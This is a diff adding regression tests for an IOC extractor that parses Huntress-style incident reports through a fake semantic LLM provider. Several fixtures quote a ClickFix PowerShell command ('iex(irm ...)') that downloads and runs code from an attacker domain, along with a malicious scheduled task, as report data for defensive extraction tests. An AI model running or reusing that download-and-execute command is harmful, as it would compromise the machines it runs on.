@@ -81,6 +81,79 @@ class IOCHuntressExtractorRegressionTestCase(unittest.TestCase):
         with open(report_path, 'r', encoding='utf-8') as handle:
             return handle.read()
 
+    def _run_semantic_stage_with_provider(self, provider, report_text, deterministic=None, **kwargs):
+        return self.extractor_module._semantic_stage.run_semantic_stage(
+            provider,
+            report_text,
+            deterministic or {'iocs': {}, 'extraction_summary': {}},
+            max_chunk_chars=kwargs.get('max_chunk_chars', 4000),
+            max_response_tokens=kwargs.get('max_response_tokens', 512),
+            validate_result=self.extractor_module._validate_ai_result_metadata,
+            prepare_payload=self.extractor_module._prepare_ai_extraction_payload,
+            filter_payload_for_task=self.extractor_module._filter_semantic_payload_for_task,
+            normalize_extraction=self.extractor_module._normalize_ai_extraction,
+        )
+
+    def _semantic_result(self, data, raw_response=None, finish_reason='stop', **extra):
+        result = {
+            'success': True,
+            'data': data,
+            'raw_response': raw_response if raw_response is not None else self.extractor_module.json.dumps(data),
+            'finish_reason': finish_reason,
+            'model': 'fake-semantic-model',
+            'json_valid_initially': not bool(extra.get('response_repaired')),
+            'json_repair_applied': bool(extra.get('response_repaired')),
+            'response_repaired': bool(extra.get('response_repaired')),
+            'repair_reason': extra.get('repair_reason'),
+            'json_repair_reason': extra.get('json_repair_reason') or extra.get('repair_reason'),
+        }
+        result.update(extra)
+        return result
+
+    class _SequencedSemanticProvider:
+        model = 'fake-semantic-model'
+
+        def __init__(self, responses_by_task):
+            self.responses_by_task = {
+                task: list(responses)
+                for task, responses in responses_by_task.items()
+            }
+            self.calls_by_task = {}
+            self.prompts_by_task = {}
+            self.max_tokens_by_task = {}
+
+        def provider_type(self):
+            return 'test'
+
+        def get_provider_display(self):
+            return 'Test Provider'
+
+        def get_batch_config(self):
+            return {'context_window': 16384, 'max_tokens': 4096}
+
+        def generate_json(self, **kwargs):
+            prompt = kwargs.get('prompt', '')
+            task_name = next(
+                (
+                    name for name in (
+                        'semantic_identity_and_auth',
+                        'semantic_process_relationships',
+                        'semantic_persistence_actions',
+                    )
+                    if name in prompt
+                ),
+                'unknown',
+            )
+            self.calls_by_task[task_name] = self.calls_by_task.get(task_name, 0) + 1
+            self.prompts_by_task.setdefault(task_name, []).append(prompt)
+            self.max_tokens_by_task.setdefault(task_name, []).append(kwargs.get('max_tokens'))
+            responses = self.responses_by_task.get(task_name) or []
+            if not responses:
+                return {'success': False, 'error': f'no response configured for {task_name}'}
+            if len(responses) > 1:
+                return responses.pop(0)
+            return responses[0]
+
     @unittest.skipUnless(
         _has_huntress_reports('report2.txt', 'report4.txt', 'report8.txt'),
         'requires gitignored Huntress example_reports corpus',
@@ -498,6 +571,176 @@ class IOCHuntressExtractorRegressionTestCase(unittest.TestCase):
         )
         self.assertFalse(review_calls)
 
+    def test_semantic_stage_accepts_clean_empty_json_without_repair_or_retry(self):
+        payload = {'registry': [], 'credential_theft_indicators': [], 'webshells': []}
+        provider = self._SequencedSemanticProvider({
+            'semantic_persistence_actions': [
+                self._semantic_result(payload, raw_response='{"registry":[],"credential_theft_indicators":[],"webshells":[]}')
+            ],
+        })
+
+        result = self._run_semantic_stage_with_provider(
+            provider,
+            "Registry\n--------\nNo registry modification or web shell was established.",
+        )
+
+        self.assertEqual(provider.calls_by_task['semantic_persistence_actions'], 1)
+        self.assertEqual(result['task_failures'], [])
+        self.assertEqual(len(result['normalized_results']), 1)
+        summary = result['normalized_results'][0]['extraction_summary']
+        self.assertFalse(summary['json_repair_applied'])
+        self.assertEqual(summary['semantic_retry_count'], 0)
+        self.assertEqual(result['normalized_results'][0]['iocs']['registry_keys'], [])
+
+    def test_semantic_stage_records_prefix_repair_metadata_for_empty_persistence(self):
+        payload = {'registry': [], 'credential_theft_indicators': [], 'webshells': []}
+        provider = self._SequencedSemanticProvider({
+            'semantic_persistence_actions': [
+                self._semantic_result(
+                    payload,
+                    raw_response='to=user<|message|>{"registry":[],"credential_theft_indicators":[],"webshells":[]}',
+                    response_repaired=True,
+                    repair_reason='provider_prefix',
+                    json_valid_initially=False,
+                    json_repair_applied=True,
+                    json_repair_reason='provider_prefix',
+                )
+            ],
+        })
+
+        result = self._run_semantic_stage_with_provider(
+            provider,
+            "Registry\n--------\nNo registry modification or web shell was established.",
+        )
+
+        self.assertFalse(result['task_failures'])
+        summary = result['normalized_results'][0]['extraction_summary']
+        self.assertFalse(summary['json_valid_initially'])
+        self.assertTrue(summary['json_repair_applied'])
+        self.assertEqual(summary['json_repair_reason'], 'provider_prefix')
+        self.assertEqual(result['normalized_results'][0]['iocs']['registry_keys'], [])
+
+    def test_semantic_stage_retries_only_failed_pass_after_truncated_empty_output(self):
+        identity_payload = {
+            'affected_users': [{'username': 'ACMATCORP\\CPalmero', 'sid': 'S-1-5-21-1', 'evidence': 'User'}],
+            'credential_exposure_users': [],
+            'compromised_users': [],
+            'created_users': [],
+            'passwords_observed': [],
+        }
+        process_payload = {
+            'commands': [
+                {
+                    'full_command': 'powershell.exe -c calc',
+                    'executable': 'powershell.exe',
+                    'parent_process': 'explorer.exe',
+                    'user': 'CPalmero',
+                    'pid': '1234',
+                    'evidence': 'powershell.exe -c calc',
+                    'evidence_origin': 'observed',
+                }
+            ],
+            'services': [],
+            'scheduled_tasks': [],
+        }
+        provider = self._SequencedSemanticProvider({
+            'semantic_identity_and_auth': [self._semantic_result(identity_payload)],
+            'semantic_process_relationships': [
+                self._semantic_result({}, raw_response='', finish_reason='length'),
+                self._semantic_result(process_payload),
+            ],
+        })
+
+        result = self._run_semantic_stage_with_provider(
+            provider,
+            "User\n--------\nUser ACMATCORP\\CPalmero SID S-1-5-21-1.\n\n"
+            "Process\n--------\npowershell.exe -c calc parent explorer.exe user CPalmero pid 1234.",
+        )
+
+        self.assertEqual(provider.calls_by_task['semantic_identity_and_auth'], 1)
+        self.assertEqual(provider.calls_by_task['semantic_process_relationships'], 2)
+        self.assertEqual(result['task_failures'], [])
+        process_provenance = [
+            item for item in result['task_provenance']
+            if item['task'] == 'semantic_process_relationships'
+        ][0]
+        self.assertEqual(process_provenance['retry_count'], 1)
+        self.assertEqual(process_provenance['attempts'][0]['finish_reason'], 'length')
+        self.assertTrue(process_provenance['attempts'][0]['empty_content'])
+        self.assertGreaterEqual(provider.max_tokens_by_task['semantic_process_relationships'][1], 512)
+
+    def test_semantic_stage_retry_exhaustion_is_failure_not_empty_result(self):
+        provider = self._SequencedSemanticProvider({
+            'semantic_process_relationships': [
+                self._semantic_result({}, raw_response='', finish_reason='length'),
+                self._semantic_result({}, raw_response='', finish_reason='length'),
+            ],
+        })
+
+        result = self._run_semantic_stage_with_provider(
+            provider,
+            "Process\n--------\nPowerShell execution was reported.",
+        )
+
+        self.assertEqual(result['normalized_results'], [])
+        self.assertEqual(len(result['task_failures']), 1)
+        failure = result['task_failures'][0]
+        self.assertEqual(failure['task'], 'semantic_process_relationships')
+        self.assertEqual(failure['finish_reason'], 'length')
+        self.assertTrue(failure['empty_content'])
+        self.assertFalse(failure['final_success'])
+        self.assertIn('finish_reason', failure['error'])
+
+    def test_semantic_stage_ambiguous_json_failure_uses_retry_path(self):
+        payload = {'registry': [], 'credential_theft_indicators': [], 'webshells': []}
+        provider = self._SequencedSemanticProvider({
+            'semantic_persistence_actions': [
+                {
+                    'success': False,
+                    'error': 'Failed to parse JSON response',
+                    'raw_response': '{"registry":[]}{"registry":[{"key":"HKCU\\\\Bad"}]}',
+                    'finish_reason': 'stop',
+                    'json_valid_initially': False,
+                    'json_repair_applied': False,
+                    'json_repair_error': 'ambiguous_multiple_json_objects',
+                    'model': 'fake-semantic-model',
+                },
+                self._semantic_result(payload),
+            ],
+        })
+
+        result = self._run_semantic_stage_with_provider(
+            provider,
+            "Registry\n--------\nNo registry modification or web shell was established.",
+        )
+
+        self.assertEqual(result['task_failures'], [])
+        provenance = result['task_provenance'][0]
+        self.assertEqual(provenance['retry_count'], 1)
+        self.assertEqual(provenance['attempts'][0]['json_repair_error'], 'ambiguous_multiple_json_objects')
+
+    def test_run_ioc_pipeline_exposes_all_semantic_failures_when_no_pass_succeeds(self):
+        provider = self._SequencedSemanticProvider({
+            'semantic_process_relationships': [
+                self._semantic_result({}, raw_response='', finish_reason='length'),
+                self._semantic_result({}, raw_response='', finish_reason='length'),
+            ],
+        })
+
+        extraction, used_ai = self.extractor_module.run_ioc_pipeline_with_provider(
+            "Process\n--------\nPowerShell execution was reported.",
+            provider,
+            pipeline_mode='semantic',
+            model_name='fake-semantic-model',
+        )
+
+        summary = extraction['extraction_summary']
+        self.assertTrue(used_ai)
+        self.assertEqual(summary['method'], 'deterministic_plus_semantic_degraded')
+        self.assertTrue(summary['ai_degraded'])
+        self.assertEqual(summary['semantic_task_successes'], 0)
+        self.assertEqual(len(summary['semantic_task_failures']), 1)
+
     def test_extract_iocs_with_ai_marks_partial_chunk_failure_as_degraded(self):
         original_semantic_runner = self.extractor_module._semantic_stage.run_semantic_stage
         previous_feature_module = sys.modules.get('utils.feature_availability')
@@ -596,6 +839,150 @@ class IOCHuntressExtractorRegressionTestCase(unittest.TestCase):
 
         task_names = [task['task_name'] for task in tasks]
         self.assertNotIn('semantic_residual_review', task_names)
+
+    def test_semantic_persistence_actions_not_routed_for_generic_scheduled_task_persistence(self):
+        build_plan = self.extractor_module._semantic_stage.build_semantic_task_plan
+        report = (
+            "Persistence\n-----------\n"
+            "Huntress reported scheduled-task persistence. Delete Scheduled Task - name: IntelSoftwareUpdater.\n"
+            "The task launches pythonw.exe and run.pyw.\n"
+        )
+
+        tasks = build_plan(report, {'iocs': {}, 'extraction_summary': {}})
+        task_names = [task['task_name'] for task in tasks]
+
+        self.assertIn('semantic_process_relationships', task_names)
+        self.assertNotIn('semantic_persistence_actions', task_names)
+
+    def test_clickfix_semantic_fixture_preserves_ownership_and_forensic_restraint(self):
+        report = (
+            "Identity\n--------\n"
+            "Affected user ACMATCORP\\CPalmero has SID S-1-5-21-506201442-1415125562-945835055-3369. "
+            "Huntress recommends a password reset, but the report does not establish exposed credentials "
+            "or that the account itself was compromised.\n\n"
+            "Process Evidence\n----------------\n"
+            "Observed PowerShell execution by user CPalmero. Executable: "
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe. Parent: "
+            "C:\\Windows\\explorer.exe. Process ID: b3358b0c-94e1-11f1-a6f4-98bd80f159f4. "
+            "Command: \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -c "
+            "\"iex(irm xkclcvlfophks.karburatorotzhigi.com/s/psc4/pr?cl -UseBasicParsing)\".\n\n"
+            "Scheduled Task Persistence\n--------------------------\n"
+            "Reported scheduled task persistence: IntelSoftwareUpdater launches "
+            "C:\\Users\\CPalmero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.PythonApp_mlzxcs7w1yl1c\\pythonw.exe "
+            "with script run.pyw. Remediation separately says to delete scheduled task IntelSoftwareUpdater. "
+            "The vendor field label Service Path refers to the scheduled-task executable path, not a Windows service.\n\n"
+            "Registry and Web Shell Review\n-----------------------------\n"
+            "No registry modification is established. No credential theft mechanism is established. "
+            "No web shell is established.\n"
+        )
+        command = (
+            '"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe" -c '
+            '"iex(irm xkclcvlfophks.karburatorotzhigi.com/s/psc4/pr?cl -UseBasicParsing)"'
+        )
+        identity_payload = {
+            'affected_users': [
+                {
+                    'username': 'ACMATCORP\\CPalmero',
+                    'sid': 'S-1-5-21-506201442-1415125562-945835055-3369',
+                    'evidence': 'Affected user ACMATCORP\\CPalmero has SID S-1-5-21-506201442-1415125562-945835055-3369.',
+                }
+            ],
+            'credential_exposure_users': [],
+            'compromised_users': [],
+            'created_users': [],
+            'passwords_observed': [],
+        }
+        process_payload = {
+            'commands': [
+                {
+                    'full_command': command,
+                    'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+                    'parent_process': 'C:\\Windows\\explorer.exe',
+                    'user': 'CPalmero',
+                    'pid': 'b3358b0c-94e1-11f1-a6f4-98bd80f159f4',
+                    'evidence': 'Observed PowerShell execution by user CPalmero.',
+                    'evidence_origin': 'observed',
+                }
+            ],
+            'services': [],
+            'scheduled_tasks': [
+                {
+                    'name': 'IntelSoftwareUpdater',
+                    'path': 'C:\\Users\\CPalmero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.PythonApp_mlzxcs7w1yl1c\\pythonw.exe',
+                    'command': 'run.pyw',
+                    'action': None,
+                    'evidence': 'Reported scheduled task persistence: IntelSoftwareUpdater launches pythonw.exe with script run.pyw.',
+                    'evidence_origin': 'reported_finding',
+                },
+                {
+                    'name': 'IntelSoftwareUpdater',
+                    'path': None,
+                    'command': None,
+                    'action': 'delete',
+                    'evidence': 'Remediation separately says to delete scheduled task IntelSoftwareUpdater.',
+                    'evidence_origin': 'remediation',
+                },
+            ],
+        }
+        persistence_payload = {
+            'registry': [],
+            'credential_theft_indicators': [],
+            'webshells': [],
+        }
+        provider = self._SequencedSemanticProvider({
+            'semantic_identity_and_auth': [self._semantic_result(identity_payload)],
+            'semantic_process_relationships': [self._semantic_result(process_payload)],
+            'semantic_persistence_actions': [self._semantic_result(persistence_payload)],
+        })
+
+        extraction, used_ai = self.extractor_module.run_ioc_pipeline_with_provider(
+            report,
+            provider,
+            pipeline_mode='semantic',
+            model_name='fake-semantic-model',
+        )
+
+        self.assertTrue(used_ai)
+        self.assertEqual(extraction['extraction_summary']['method'], 'deterministic_plus_semantic')
+        users = extraction['iocs']['users']
+        self.assertTrue(
+            any(
+                item['value'] == 'ACMATCORP\\CPalmero'
+                and item.get('sid') == 'S-1-5-21-506201442-1415125562-945835055-3369'
+                and item.get('context') == 'Affected user in report'
+                for item in users
+            )
+        )
+        self.assertFalse(any(item.get('context') == 'Credential exposure candidate' for item in users))
+        self.assertFalse(any(item.get('context') == 'Compromised user in report' for item in users))
+        self.assertTrue(any(item['value'] == command for item in extraction['iocs']['commands']))
+        command_item = next(item for item in extraction['iocs']['commands'] if item['value'] == command)
+        self.assertEqual(command_item['executable'], 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe')
+        self.assertEqual(command_item['parent'], 'C:\\Windows\\explorer.exe')
+        self.assertEqual(command_item['user'], 'CPalmero')
+        self.assertEqual(command_item['pid'], 'b3358b0c-94e1-11f1-a6f4-98bd80f159f4')
+
+        tasks = extraction['iocs']['scheduled_tasks']
+        self.assertTrue(
+            any(
+                item['name'] == 'IntelSoftwareUpdater'
+                and item.get('path') == 'C:\\Users\\CPalmero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.PythonApp_mlzxcs7w1yl1c\\pythonw.exe'
+                and item.get('command') == 'run.pyw'
+                and item.get('evidence_origin') == 'reported_finding'
+                for item in tasks
+            )
+        )
+        self.assertTrue(
+            any(
+                item['name'] == 'IntelSoftwareUpdater'
+                and item.get('action') == 'delete'
+                and item.get('evidence_origin') == 'remediation'
+                for item in tasks
+            )
+        )
+        self.assertEqual(extraction['iocs']['services'], [])
+        self.assertEqual(extraction['iocs']['registry_keys'], [])
+        self.assertEqual(extraction['iocs']['credentials'], [])
 
     def test_filter_semantic_payload_for_task_strips_process_task_user_leakage(self):
         payload = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
@@ -1469,6 +1856,180 @@ class IOCHuntressExtractorRegressionTestCase(unittest.TestCase):
             processed['audit_overlay']['validated_deltas'][0]['additions'][0]['value'],
             'audit-added.example',
         )
+
+    def _clickfix_report_variants(self):
+        command = (
+            '"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe" -c '
+            '"iex(irm xkclcvlfophks.karburatorotzhigi.com/s/psc4/pr?cl -UseBasicParsing)"'
+        )
+        task_path = (
+            'C:\\Users\\CPalmero\\AppData\\Local\\Microsoft\\WindowsApps\\'
+            'Microsoft.PythonApp_mlzxcs7w1yl1c\\pythonw.exe'
+        )
+        return {
+            'huntress': (
+                "Portal: https://huntress.io/org/105204/infection_reports/2356636\n\n"
+                "Lead Signal Information\n-----------------------\n"
+                "Host: ATN86573\n"
+                "User Account: ACMATCORP\\CPalmero\n"
+                "SID: S-1-5-21-506201442-1415125562-945835055-3369\n"
+                "Command Line: " + command + "\n"
+                "Parent Process: explorer.exe\n\n"
+                "Persistence\n-----------\n"
+                "Type: Windows Scheduled Task\n"
+                "Name: IntelSoftwareUpdater\n"
+                "Service Path: " + task_path + "\n"
+                "Parameters: run.pyw\n"
+                "Domain: xkclcvlfophks.karburatorotzhigi.com\n"
+            ),
+            'generic_narrative': (
+                "Incident Summary\n----------------\n"
+                "User ACMATCORP\\CPalmero on host ATN86573 has SID "
+                "S-1-5-21-506201442-1415125562-945835055-3369.\n\n"
+                "Process Evidence\n----------------\n"
+                "Command Line: " + command + "\n"
+                "Parent Process: explorer.exe\n"
+                "User: ACMATCORP\\CPalmero\n\n"
+                "Scheduled Task\n--------------\n"
+                "Scheduled Task: IntelSoftwareUpdater\n"
+                "Executable: " + task_path + "\n"
+                "Script: run.pyw\n"
+                "Domain: xkclcvlfophks.karburatorotzhigi.com\n"
+            ),
+            'alternative_vendor_style': (
+                "Detection Details\n-----------------\n"
+                "Endpoint: ATN86573\n"
+                "Actor User: ACMATCORP\\CPalmero\n"
+                "SID: S-1-5-21-506201442-1415125562-945835055-3369\n\n"
+                "Process Tree\n------------\n"
+                "Command: " + command + "\n"
+                "Parent Process: explorer.exe\n\n"
+                "Network Indicators\n------------------\n"
+                "Domain: xkclcvlfophks.karburatorotzhigi.com\n\n"
+                "Persistence\n-----------\n"
+                "Scheduled Task: IntelSoftwareUpdater\n"
+                "Task executable: " + task_path + "\n"
+                "Task script: run.pyw\n"
+            ),
+            'generic_unstructured': (
+                "A SOC note reported the following without vendor headings.\n"
+                "Host: ATN86573\n"
+                "User Account: ACMATCORP\\CPalmero\n"
+                "SID: S-1-5-21-506201442-1415125562-945835055-3369\n"
+                "Command Line: " + command + "\n"
+                "Parent Process: explorer.exe\n"
+                "Scheduled Task: IntelSoftwareUpdater\n"
+                "The task used " + task_path + " to run run.pyw and reached xkclcvlfophks.karburatorotzhigi.com."
+            ),
+        }
+
+    def test_source_adapters_normalize_clickfix_reports_without_vendor_specific_ioc_shape(self):
+        normalizer = self.extractor_module._report_normalizer
+        variants = self._clickfix_report_variants()
+
+        expected_domain = 'xkclcvlfophks.karburatorotzhigi.com'
+        for name, report in variants.items():
+            with self.subTest(source=name):
+                canonical = normalizer.normalize_report_source(report)
+                extraction = self.extractor_module.run_deterministic_ioc_extraction(report)
+                task_names = [
+                    task['task_name']
+                    for task in self.extractor_module._semantic_stage.build_semantic_task_plan(
+                        normalizer.render_canonical_report_text(canonical),
+                        extraction,
+                        canonical_report=canonical,
+                    )
+                ]
+
+                self.assertIn(expected_domain, {item['value'] for item in extraction['iocs']['domains']})
+                self.assertIn('ACMATCORP\\CPalmero', {
+                    item['username']
+                    for item in extraction['extraction_summary']['affected_users']
+                })
+                self.assertIn('S-1-5-21-506201442-1415125562-945835055-3369', extraction['iocs']['sids'])
+                self.assertTrue(any(item.get('name') == 'IntelSoftwareUpdater' for item in extraction['iocs']['scheduled_tasks']))
+                self.assertIn('semantic_identity_and_auth', task_names)
+                self.assertIn('semantic_process_relationships', task_names)
+                self.assertNotIn('huntress_iocs', extraction)
+                self.assertNotIn('sentinelone_iocs', extraction)
+
+    def test_generic_fallback_preserves_unrecognized_report_and_still_routes_evidence(self):
+        normalizer = self.extractor_module._report_normalizer
+        report = (
+            "Bespoke analyst memo: user ACMATCORP\\CPalmero on ATN86573 launched "
+            "PowerShell from Explorer. Command Line: powershell.exe -c irm xkclcvlfophks.karburatorotzhigi.com. "
+            "Scheduled Task: IntelSoftwareUpdater."
+        )
+
+        canonical = normalizer.normalize_report_source(report)
+        extraction = self.extractor_module.run_deterministic_ioc_extraction(report)
+        tasks = self.extractor_module._semantic_stage.build_semantic_task_plan(
+            normalizer.render_canonical_report_text(canonical),
+            extraction,
+            canonical_report=canonical,
+        )
+
+        self.assertEqual(canonical.source_type, 'generic')
+        self.assertEqual(canonical.sections[0].source_section_name, 'Full Report')
+        self.assertEqual(canonical.raw_text, report)
+        self.assertTrue(any(item['value'] == 'xkclcvlfophks.karburatorotzhigi.com' for item in extraction['iocs']['domains']))
+        self.assertIn('semantic_process_relationships', [task['task_name'] for task in tasks])
+
+    def test_huntress_adapter_relabels_scheduled_task_service_path_without_creating_service(self):
+        normalizer = self.extractor_module._report_normalizer
+        report = (
+            "Portal: https://huntress.io/org/105204/infection_reports/2356636\n\n"
+            "Persistence\n-----------\n"
+            "Type: Windows Scheduled Task\n"
+            "Name: IntelSoftwareUpdater\n"
+            "Service Path: C:\\Users\\CPalmero\\AppData\\Local\\Microsoft\\WindowsApps\\pythonw.exe\n"
+            "Parameters: run.pyw\n"
+        )
+
+        canonical = normalizer.normalize_report_source(report)
+        prepared = normalizer.render_canonical_report_text(canonical)
+        extraction = self.extractor_module.run_deterministic_ioc_extraction(report)
+
+        self.assertEqual(canonical.source_type, 'huntress')
+        self.assertEqual(canonical.source_report_id, '2356636')
+        self.assertIn('Scheduled Task Executable Path:', prepared)
+        self.assertNotIn('Service Path:', prepared)
+        self.assertTrue(any(item.get('name') == 'IntelSoftwareUpdater' for item in extraction['iocs']['scheduled_tasks']))
+        self.assertEqual(extraction['iocs']['services'], [])
+
+    def test_source_provenance_is_separate_from_extraction_method(self):
+        report = (
+            "Portal: https://huntress.io/org/105204/infection_reports/2356636\n"
+            "Network\n-------\n"
+            "Domain: xkclcvlfophks.karburatorotzhigi.com\n"
+        )
+
+        extraction = self.extractor_module.run_deterministic_ioc_extraction(report)
+        record = next(
+            item
+            for item in extraction['_ioc_records']
+            if item['ioc_type'] == 'Domain'
+            and item['value'] == 'xkclcvlfophks.karburatorotzhigi.com'
+        )
+
+        self.assertEqual(record['source'], 'regex')
+        self.assertEqual(record['extraction_method'], 'regex')
+        self.assertEqual(record['evidence_source_type'], 'huntress')
+        self.assertEqual(record['evidence_source_product'], 'Huntress')
+        self.assertEqual(record['evidence_source_report_id'], '2356636')
+
+    def test_generic_persistence_prose_alone_does_not_route_persistence_task(self):
+        build_plan = self.extractor_module._semantic_stage.build_semantic_task_plan
+        report = (
+            "Overview\n--------\n"
+            "Persistence is a common adversary objective, but this report only documents "
+            "a scheduled task named IntelSoftwareUpdater launching powershell.exe.\n"
+        )
+
+        task_names = [task['task_name'] for task in build_plan(report, {'iocs': {}, 'extraction_summary': {}})]
+
+        self.assertIn('semantic_process_relationships', task_names)
+        self.assertNotIn('semantic_persistence_actions', task_names)
 
 
 if __name__ == '__main__':
